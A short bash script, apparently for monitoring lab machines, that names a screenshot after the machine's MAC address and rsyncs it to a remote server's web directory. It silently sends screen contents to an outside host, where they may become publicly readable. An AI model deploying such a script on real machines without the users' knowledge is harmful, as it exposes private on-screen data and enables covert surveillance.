#/bin/bash
MAC_ADDRESS=$(cat /sys/class/net/eth0/address)
MAC_ADDRESS=`echo $MAC_ADDRESS | tr -d -c ".[:alnum:]"`
import -window root ~/Pictures/$MAC_ADDRESS.png
rsync ~/Pictures/$MAC_ADDRESS.png lbym@130.157.70.115:/var/www/html/Desktops/

